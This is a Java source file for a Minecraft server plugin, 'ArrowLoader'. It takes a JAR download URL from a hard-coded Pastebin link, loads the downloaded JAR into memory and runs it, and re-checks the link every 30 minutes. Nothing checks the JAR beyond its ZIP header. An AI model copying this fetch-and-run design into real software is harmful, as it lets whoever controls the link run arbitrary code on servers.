package me.arrow;

import lombok.Getter;
import lombok.Setter;
import me.arrow.event.ArrowLoadEvent;
import me.arrow.event.ArrowUnloadEvent;
import me.arrow.utility.MemoryJarLoader;
import org.bstats.bukkit.Metrics;
import org.bstats.charts.SimplePie;
import org.bstats.charts.SingleLineChart;
import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.util.Locale;
import java.util.function.Consumer;

public class Core extends JavaPlugin implements CommandExecutor {

    private static final String PASTEBIN_RAW_URL = "https://pastebin.com/raw/EVQABwGt";

    private static final int BSTATS_PLUGIN_ID = 31291;

    private static final int CONNECT_TIMEOUT_MS = 5000;
    private static final int READ_TIMEOUT_MS = 15000;
    private static final int BUFFER_SIZE = 8192;
    private static final int MAX_JAR_BYTES = 64 * 1024 * 1024;
    private static final String CACHED_JAR_NAME = "anticheat.jar";
    private static final String CACHED_URL_NAME = "download_url.txt";
    private static final long UPDATE_INTERVAL_MS = 30 * 60 * 1000;
    private static final int[] RETRY_DELAYS_MS = {1000, 3000};
    private static final long[] STARTUP_RETRY_DELAYS_MS = {1000, 2000, 4000};
    private static final String WEBHOOK_URL = "";

    @Getter
    @Setter
    private static Core plugin;

    @Getter
    @Setter
    private Object arrowInstance;

    @Getter
    @Setter
    private Class<?> arrowClass;

    private MemoryJarLoader memoryJarLoader;
    private Metrics metrics;
    private File cachedJarFile;
    private File cachedUrlFile;
    private String currentDownloadUrl;
    private long loadTimeMs;
    private long pastebinFetchTimeMs;
    private long downloadTimeMs;
    private long classLoadingTimeMs;
    private boolean loadedFromCache;
    private volatile boolean updateAvailable;
    private volatile boolean autoReload;
    private int reloadCount;
    private volatile boolean updateCheckerRunning;
    private Thread updateCheckerThread;

    @Override
    public void onEnable() {
        long startTime = System.currentTimeMillis();
        Core.setPlugin(this);
        cachedJarFile = new File(getDataFolder(), CACHED_JAR_NAME);
        cachedUrlFile = new File(getDataFolder(), CACHED_URL_NAME);

        try {
            startMetrics();

            if (!getDataFolder().exists() && !getDataFolder().mkdirs()) {
                throw new IOException("Failed to create plugin data folder.");
            }

            loadAnticheat(false);

            startUpdateChecker();

            getCommand("arrowloader").setExecutor(this);

            long endTime = System.currentTimeMillis();
            loadTimeMs = endTime - startTime;
            getLogger().info("ArrowLoader enabled in " + loadTimeMs + "ms.");
        } catch (Throwable throwable) {
            Throwable root = unwrap(throwable);
            getLogger().severe("Failed to initialize ArrowLoader: " + root.getClass().getSimpleName() + ": " + root.getMessage());
            getServer().getPluginManager().disablePlugin(this);
        }
    }

    @Override
    public void onDisable() {
        long startTime = System.currentTimeMillis();

        stopUpdateChecker();
        shutdownMetrics();
        shutdownArrow();
        closeMemoryLoader();

        arrowInstance = null;
        arrowClass = null;
        memoryJarLoader = null;
        updateAvailable = false;
        Core.setPlugin(null);

        long endTime = System.currentTimeMillis();
        getLogger().info("ArrowLoader shutdown in " + (endTime - startTime) + "ms.");
    }

    private void loadAnticheat(boolean forceDownload) throws Exception {
        byte[] jarBytes = null;
        String cachedUrl = null;
        pastebinFetchTimeMs = 0;
        downloadTimeMs = 0;

        if (cachedUrlFile.exists()) {
            try {
                cachedUrl = Files.readString(cachedUrlFile.toPath(), StandardCharsets.UTF_8).trim();
            } catch (IOException ignored) {
            }
        }

        if (!forceDownload && cachedJarFile.exists() && cachedUrl != null) {
            try {
                jarBytes = loadCachedJar();
                loadedFromCache = true;
                currentDownloadUrl = cachedUrl;
                getLogger().info("Loading anticheat from cache (URL matched)...");
            } catch (IOException e) {
                getLogger().warning("Cached JAR is invalid: " + e.getMessage());
                jarBytes = null;
            }
        }

        if (jarBytes == null) {
            try {
                String downloadUrl = fetchDownloadUrl(PASTEBIN_RAW_URL);

                boolean cacheValid = cachedUrl != null && cachedUrl.equals(downloadUrl) && cachedJarFile.exists();
                if (cacheValid) {
                    jarBytes = loadCachedJar();
                    loadedFromCache = true;
                    currentDownloadUrl = downloadUrl;
                    getLogger().info("Loading anticheat from cache...");
                }
            } catch (IOException ignored) {
            }
        }

        if (jarBytes == null) {
            IOException lastEx = null;

            for (int attempt = 0; attempt <= STARTUP_RETRY_DELAYS_MS.length; attempt++) {
                try {
                    long t1 = System.currentTimeMillis();
                    String downloadUrl = fetchDownloadUrl(PASTEBIN_RAW_URL);
                    long t2 = System.currentTimeMillis();
                    pastebinFetchTimeMs += t2 - t1;

                    byte[] downloaded = downloadJarWithRetry(downloadUrl);
                    long t3 = System.currentTimeMillis();
                    downloadTimeMs += t3 - t2;

                    saveJarCache(downloaded);
                    saveCachedUrl(downloadUrl);
                    currentDownloadUrl = downloadUrl;
                    loadedFromCache = false;
                    jarBytes = downloaded;
                    break;
                } catch (IOException e) {
                    lastEx = e;
                    if (attempt < STARTUP_RETRY_DELAYS_MS.length) {
                        getLogger().warning("Fetch cycle failed (attempt " + (attempt + 1) + "), retrying in " + STARTUP_RETRY_DELAYS_MS[attempt] + "ms...");
                        try {
                            Thread.sleep(STARTUP_RETRY_DELAYS_MS[attempt]);
                        } catch (InterruptedException ie) {
                            Thread.currentThread().interrupt();
                            throw e;
                        }
                    }
                }
            }

            if (jarBytes == null) {
                if (loadCachedJarIfAvailable() != null) {
                    jarBytes = loadCachedJarIfAvailable();
                    getLogger().warning("Download failed, using cached version: " + (lastEx != null ? lastEx.getMessage() : "unknown error"));
                } else {
                    throw new IOException("Download failed and no valid cache: " + (lastEx != null ? lastEx.getMessage() : "unknown error"));
                }
            }
        }

        long t4 = System.currentTimeMillis();
        memoryJarLoader = new MemoryJarLoader(jarBytes, getClassLoader());
        arrowClass = memoryJarLoader.loadClass("me.arrow.Arrow");
        arrowInstance = constructArrow(arrowClass, getDataFolder());
        invokeArrowEnable(arrowClass, arrowInstance);
        long t5 = System.currentTimeMillis();
        classLoadingTimeMs = t5 - t4;

        try {
            getServer().getPluginManager().callEvent(new ArrowLoadEvent(arrowInstance));
        } catch (Throwable ignored) {
        }

        getLogger().info("Arrow Anticheat loaded successfully" + (loadedFromCache ? " (from cache)" : "") + ".");
    }

    private byte[] loadCachedJarIfAvailable() {
        try {
            return loadCachedJar();
        } catch (IOException e) {
            return null;
        }
    }

    private byte[] loadCachedJar() throws IOException {
        if (!cachedJarFile.exists() || cachedJarFile.length() == 0) {
            throw new IOException("Cache file missing or empty.");
        }
        byte[] bytes = Files.readAllBytes(cachedJarFile.toPath());
        if (!looksLikeJar(bytes)) {
            throw new IOException("Cached file is not a valid JAR.");
        }
        return bytes;
    }

    private void saveJarCache(byte[] jarBytes) throws IOException {
        Files.write(cachedJarFile.toPath(), jarBytes);
    }

    private void saveCachedUrl(String url) throws IOException {
        Files.writeString(cachedUrlFile.toPath(), url, StandardCharsets.UTF_8);
    }

    private void clearJarCache() {
        if (cachedJarFile.exists() && !cachedJarFile.delete()) {
            getLogger().warning("Failed to delete cached JAR.");
        }
        if (cachedUrlFile.exists() && !cachedUrlFile.delete()) {
            getLogger().warning("Failed to delete cached URL.");
        }
    }

    private byte[] downloadJarWithRetry(String urlString) throws IOException {
        IOException lastException = null;

        for (int attempt = 0; attempt <= RETRY_DELAYS_MS.length; attempt++) {
            try {
                return downloadJar(urlString);
            } catch (IOException e) {
                lastException = e;
                if (attempt < RETRY_DELAYS_MS.length) {
                    getLogger().warning("Download failed (attempt " + (attempt + 1) + "), retrying in " + RETRY_DELAYS_MS[attempt] + "ms...");
                    try {
                        Thread.sleep(RETRY_DELAYS_MS[attempt]);
                    } catch (InterruptedException ie) {
                        Thread.currentThread().interrupt();
                        throw e;
                    }
                }
            }
        }

        throw lastException;
    }

    private void startUpdateChecker() {
        updateCheckerRunning = true;
        updateCheckerThread = new Thread(() -> {
            while (updateCheckerRunning) {
                try {
                    Thread.sleep(UPDATE_INTERVAL_MS);
                } catch (InterruptedException e) {
                    break;
                }

                if (!updateCheckerRunning) break;

                try {
                    String latestUrl = fetchDownloadUrl(PASTEBIN_RAW_URL);
                    if (!latestUrl.equals(currentDownloadUrl)) {
                        updateAvailable = true;
                        runOnMain(() -> {
                            getLogger().info("A new anticheat version is available. Use /arrowloader reload to update.");
                            Bukkit.broadcast("§e[ArrowLoader] A new anticheat version is available. Use /arrowloader reload to update.", "arrowloader.admin");
                        });
                        sendWebhook("A new anticheat version is available. Server: " + getServerImplementationName());

                        if (autoReload) {
                            getLogger().info("Auto-reload is enabled, reloading anticheat...");
                            try {
                                byte[] jarBytes = downloadJarWithRetry(latestUrl);
                                runOnMain(() -> completeReload(null, latestUrl, jarBytes));
                            } catch (IOException e) {
                                getLogger().severe("Auto-reload failed to download: " + e.getMessage());
                            }
                        }
                    }
                } catch (IOException ignored) {
                }
            }
        }, "ArrowLoader-UpdateChecker");
        updateCheckerThread.setDaemon(true);
        updateCheckerThread.start();
    }

    private void stopUpdateChecker() {
        updateCheckerRunning = false;
        if (updateCheckerThread != null) {
            updateCheckerThread.interrupt();
            updateCheckerThread = null;
        }
    }

    private void sendWebhook(String message) {
        if (WEBHOOK_URL.isEmpty()) {
            return;
        }

        try {
            HttpURLConnection conn = (HttpURLConnection) new URL(WEBHOOK_URL).openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            conn.setConnectTimeout(CONNECT_TIMEOUT_MS);
            conn.setReadTimeout(READ_TIMEOUT_MS);
            String json = "{\"content\":\"" + message + "\"}";
            conn.getOutputStream().write(json.getBytes(StandardCharsets.UTF_8));
            conn.getInputStream();
            conn.disconnect();
        } catch (IOException ignored) {
        }
    }

    private void startMetrics() {
        if (BSTATS_PLUGIN_ID <= 0) {
            getLogger().warning("bStats metrics are disabled.");
            return;
        }

        try {
            metrics = new Metrics(this, BSTATS_PLUGIN_ID);

            metrics.addCustomChart(new SimplePie("loaded_from_cache", () -> loadedFromCache ? "cache" : "fresh"));
            metrics.addCustomChart(new SimplePie("server_type", () -> getServerImplementationName()));
            metrics.addCustomChart(new SingleLineChart("load_time_ms", () -> (int) loadTimeMs));
            metrics.addCustomChart(new SingleLineChart("reload_count", () -> reloadCount));

            getLogger().info("bStats metrics enabled.");
        } catch (Throwable throwable) {
            getLogger().warning("Failed to start bStats metrics: " + throwable.getClass().getSimpleName() + ": " + throwable.getMessage());
            metrics = null;
        }
    }

    private void shutdownMetrics() {
        if (metrics == null) {
            return;
        }

        try {
            metrics.shutdown();
        } catch (Throwable ignored) {
        } finally {
            metrics = null;
        }
    }

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (!command.getName().equalsIgnoreCase("arrowloader")) {
            return false;
        }

        if (!sender.hasPermission("arrowloader.admin")) {
            sender.sendMessage("§cYou don't have permission to use this command.");
            return true;
        }

        if (args.length == 0) {
            sendHelp(sender);
            return true;
        }

        switch (args[0].toLowerCase(Locale.ROOT)) {
            case "reload":
            case "rl":
                handleReload(sender);
                return true;
            case "status":
            case "info":
            case "st":
                handleStatus(sender);
                return true;
            case "autoreload":
                handleAutoReload(sender, args);
                return true;
            default:
                sendHelp(sender);
                return true;
        }
    }

    private void sendHelp(CommandSender sender) {
        sender.sendMessage("§6=== ArrowLoader Commands ===");
        sender.sendMessage("§e/arrowloader help §7- Show this help");
        sender.sendMessage("§e/arrowloader status §7- Show loader status");
        sender.sendMessage("§e/arrowloader reload §7- Re-download and reload the anticheat");
        sender.sendMessage("§e/arrowloader autoreload <on|off> §7- Toggle auto-reload on update");
    }

    private void handleStatus(CommandSender sender) {
        sender.sendMessage("§6=== ArrowLoader Status ===");
        sender.sendMessage("§7Version: §f" + getDescription().getVersion());
        sender.sendMessage("§7Server: §f" + getServerImplementationName());
        sender.sendMessage("§7Download URL: §f" + (currentDownloadUrl != null ? currentDownloadUrl : "§cNot fetched"));
        sender.sendMessage("§7Anticheat: " + (arrowInstance != null ? "§aLoaded" : "§cNot loaded"));
        if (arrowInstance != null) {
            sender.sendMessage("§7Load time: §f" + loadTimeMs + "ms");
            sender.sendMessage("§7Phases: §fPastebin " + pastebinFetchTimeMs + "ms | Download " + downloadTimeMs + "ms | Load " + classLoadingTimeMs + "ms");
            sender.sendMessage("§7Source: " + (loadedFromCache ? "§eCache" : "§aFresh download"));
            sender.sendMessage("§7Reloads: §f" + reloadCount);
        }
        sender.sendMessage("§7Cache: " + (cachedJarFile != null && cachedJarFile.exists() ? "§aAvailable" : "§cUnavailable"));
        sender.sendMessage("§7Update: " + (updateAvailable ? "§eUpdate available" : "§aUp to date"));
        sender.sendMessage("§7Auto-reload: " + (autoReload ? "§aEnabled" : "§7Disabled"));
        sender.sendMessage("§7Webhook: " + (WEBHOOK_URL.isEmpty() ? "§cNot set" : "§aConfigured"));
    }

    private void handleAutoReload(CommandSender sender, String[] args) {
        if (args.length < 2) {
            sender.sendMessage("§cUsage: /arrowloader autoreload <on|off>");
            return;
        }

        switch (args[1].toLowerCase(Locale.ROOT)) {
            case "on":
            case "true":
            case "enable":
                autoReload = true;
                sender.sendMessage("§aAuto-reload enabled.");
                break;
            case "off":
            case "false":
            case "disable":
                autoReload = false;
                sender.sendMessage("§7Auto-reload disabled.");
                break;
            default:
                sender.sendMessage("§cUsage: /arrowloader autoreload <on|off>");
        }
    }

    private void handleReload(CommandSender sender) {
        sender.sendMessage("§eReloading Arrow Anticheat...");

        if (isFolia()) {
            runAsyncFolia(() -> {
                try {
                    String newUrl = fetchDownloadUrl(PASTEBIN_RAW_URL);
                    byte[] jarBytes = downloadJarWithRetry(newUrl);
                    runGlobalFolia(() -> completeReload(sender, newUrl, jarBytes));
                } catch (Exception e) {
                    sender.sendMessage("§cReload failed: " + e.getMessage());
                }
            });
        } else {
            getServer().getScheduler().runTaskAsynchronously(this, () -> {
                try {
                    String newUrl = fetchDownloadUrl(PASTEBIN_RAW_URL);
                    byte[] jarBytes = downloadJarWithRetry(newUrl);
                    getServer().getScheduler().runTask(this, () -> completeReload(sender, newUrl, jarBytes));
                } catch (Exception e) {
                    sender.sendMessage("§cReload failed: " + e.getMessage());
                }
            });
        }
    }

    private void runAsyncFolia(Runnable runnable) {
        try {
            Object scheduler = Bukkit.class.getMethod("getAsyncScheduler").invoke(null);
            scheduler.getClass().getMethod("runNow", JavaPlugin.class, Consumer.class)
                    .invoke(scheduler, this, (Consumer<Object>) t -> runnable.run());
        } catch (Exception e) {
            new Thread(runnable, "ArrowLoader-Async").start();
        }
    }

    private void runGlobalFolia(Runnable runnable) {
        try {
            Object scheduler = Bukkit.class.getMethod("getGlobalRegionScheduler").invoke(null);
            scheduler.getClass().getMethod("run", JavaPlugin.class, Consumer.class)
                    .invoke(scheduler, this, (Consumer<Object>) t -> runnable.run());
        } catch (Exception e) {
            runnable.run();
        }
    }

    private void runOnMain(Runnable runnable) {
        if (isFolia()) {
            runGlobalFolia(runnable);
        } else {
            getServer().getScheduler().runTask(this, runnable);
        }
    }

    private void completeReload(CommandSender sender, String newUrl, byte[] jarBytes) {
        try {
            saveJarCache(jarBytes);
            saveCachedUrl(newUrl);

            MemoryJarLoader newLoader = new MemoryJarLoader(jarBytes, getClassLoader());
            Class<?> newClass = newLoader.loadClass("me.arrow.Arrow");
            Object newInstance = constructArrow(newClass, getDataFolder());

            invokeArrowEnable(newClass, newInstance);

            try {
                getServer().getPluginManager().callEvent(new ArrowLoadEvent(newInstance));
            } catch (Throwable ignored) {
            }

            shutdownArrow();
            closeMemoryLoader();

            memoryJarLoader = newLoader;
            arrowClass = newClass;
            arrowInstance = newInstance;
            currentDownloadUrl = newUrl;
            loadedFromCache = false;
            updateAvailable = false;
            reloadCount++;

            String msg = "§aArrow Anticheat reloaded successfully.";
            if (sender != null) {
                sender.sendMessage(msg);
            }
            getLogger().info("Arrow Anticheat reloaded (" + reloadCount + ").");
            sendWebhook("Anticheat reloaded successfully on " + getServerImplementationName() + ".");
        } catch (Exception e) {
            getLogger().severe("Failed to reload anticheat: " + e.getMessage());
            if (sender != null) {
                sender.sendMessage("§cFailed to reload anticheat: " + e.getMessage());
            }
        }
    }

    private Object constructArrow(Class<?> clazz, File folder) throws Exception {
        try {
            Constructor<?> constructor = clazz.getConstructor(JavaPlugin.class, File.class);
            constructor.setAccessible(true);
            return constructor.newInstance(this, folder);
        } catch (NoSuchMethodException ignored) {
        }

        try {
            Constructor<?> constructor = clazz.getConstructor(JavaPlugin.class, File.class, int.class);
            constructor.setAccessible(true);
            return constructor.newInstance(this, folder, 0);
        } catch (NoSuchMethodException ignored) {
        }

        throw new NoSuchMethodException("me.arrow.Arrow must have constructor (JavaPlugin, File) or (JavaPlugin, File, int).");
    }

    private void invokeArrowEnable(Class<?> clazz, Object instance) throws Exception {
        try {
            Method method = clazz.getMethod("onEnable");
            method.setAccessible(true);
            method.invoke(instance);
            return;
        } catch (NoSuchMethodException ignored) {
        }

        try {
            Method method = clazz.getMethod("onEnable", int.class);
            method.setAccessible(true);
            method.invoke(instance, 0);
            return;
        } catch (NoSuchMethodException ignored) {
        }

        throw new NoSuchMethodException("me.arrow.Arrow must have onEnable() or onEnable(int).");
    }

    private void shutdownArrow() {
        if (arrowInstance == null || arrowClass == null) {
            return;
        }

        try {
            getServer().getPluginManager().callEvent(new ArrowUnloadEvent());
        } catch (Throwable ignored) {
        }

        try {
            try {
                Method onDisable = arrowClass.getMethod("onDisable");
                onDisable.setAccessible(true);
                onDisable.invoke(arrowInstance);
                getLogger().info("Arrow Anticheat unloaded successfully.");
                return;
            } catch (NoSuchMethodException ignored) {
            }

            try {
                Method shutdown = arrowClass.getMethod("shutdown");
                shutdown.setAccessible(true);
                shutdown.invoke(arrowInstance);
                getLogger().info("Arrow Anticheat shutdown successfully.");
            } catch (NoSuchMethodException ignored) {
                getLogger().warning("Arrow Anticheat has no onDisable() or shutdown() method.");
            }
        } catch (Throwable throwable) {
            Throwable root = unwrap(throwable);
            getLogger().severe("ArrowLoader had an error while shutting down Arrow: " + root.getClass().getSimpleName() + ": " + root.getMessage());
        }
    }

    private void closeMemoryLoader() {
        if (memoryJarLoader == null) {
            return;
        }

        try {
            memoryJarLoader.close();
        } catch (Throwable ignored) {
        } finally {
            memoryJarLoader = null;
        }
    }

    private String fetchDownloadUrl(String pastebinRawUrl) throws IOException {
        URL pastebinUrl = validateHttpUrl(pastebinRawUrl, "Pastebin URL");
        URLConnection connection = pastebinUrl.openConnection();
        connection.setConnectTimeout(CONNECT_TIMEOUT_MS);
        connection.setReadTimeout(READ_TIMEOUT_MS);
        connection.setUseCaches(false);
        connection.setRequestProperty("User-Agent", "ArrowLoader/" + getDescription().getVersion());

        try (BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream(), StandardCharsets.UTF_8))) {
            String line;

            while ((line = reader.readLine()) != null) {
                String cleaned = cleanLine(line);

                if (cleaned.isEmpty() || cleaned.startsWith("#")) {
                    continue;
                }

                validateHttpUrl(cleaned, "Arrow core download URL");
                return cleaned;
            }
        }

        throw new IOException("Pastebin response did not contain a download URL.");
    }

    private byte[] downloadJar(String urlString) throws IOException {
        URL url = validateHttpUrl(urlString, "Arrow core download URL");
        URLConnection connection = url.openConnection();
        connection.setConnectTimeout(CONNECT_TIMEOUT_MS);
        connection.setReadTimeout(READ_TIMEOUT_MS);
        connection.setUseCaches(false);
        connection.setRequestProperty("User-Agent", "ArrowLoader/" + getDescription().getVersion());

        int contentLength = connection.getContentLength();
        if (contentLength > MAX_JAR_BYTES) {
            throw new IOException("Downloaded JAR is too large.");
        }

        try (InputStream inputStream = connection.getInputStream();
             ByteArrayOutputStream outputStream = new ByteArrayOutputStream(Math.max(contentLength, BUFFER_SIZE))) {

            byte[] buffer = new byte[BUFFER_SIZE];
            int read;
            int total = 0;

            while ((read = inputStream.read(buffer)) != -1) {
                total += read;

                if (total > MAX_JAR_BYTES) {
                    throw new IOException("Downloaded JAR exceeded maximum allowed size.");
                }

                outputStream.write(buffer, 0, read);
            }

            byte[] bytes = outputStream.toByteArray();

            if (!looksLikeJar(bytes)) {
                throw new IOException("Downloaded file does not look like a valid JAR.");
            }

            return bytes;
        }
    }

    private URL validateHttpUrl(String value, String name) throws IOException {
        if (value == null || value.isEmpty()) {
            throw new IOException(name + " is null or empty.");
        }

        URL url = new URL(value);
        String protocol = url.getProtocol().toLowerCase(Locale.ROOT);

        if (!protocol.equals("http") && !protocol.equals("https")) {
            throw new IOException(name + " must use http or https.");
        }

        return url;
    }

    private String cleanLine(String value) {
        if (value == null) {
            return "";
        }

        return value
                .replace("\uFEFF", "")
                .replace("\u200B", "")
                .replace("\u200C", "")
                .replace("\u200D", "")
                .trim();
    }

    private boolean looksLikeJar(byte[] bytes) {
        return bytes != null
                && bytes.length >= 4
                && bytes[0] == 'P'
                && bytes[1] == 'K'
                && bytes[2] == 3
                && bytes[3] == 4;
    }

    private Throwable unwrap(Throwable throwable) {
        Throwable current = throwable;
        int depth = 0;

        while (current instanceof InvocationTargetException && ((InvocationTargetException) current).getTargetException() != null) {
            if (++depth > 10) {
                break;
            }
            current = ((InvocationTargetException) current).getTargetException();
        }

        return current == null ? throwable : current;
    }

    public boolean isFolia() {
        try {
            Class.forName("io.papermc.paper.threadedregions.RegionizedServer");
            return true;
        } catch (ClassNotFoundException ignored) {
            return false;
        }
    }

    public String getServerImplementationName() {
        return isFolia() ? "Folia" : Bukkit.getName();
    }
}
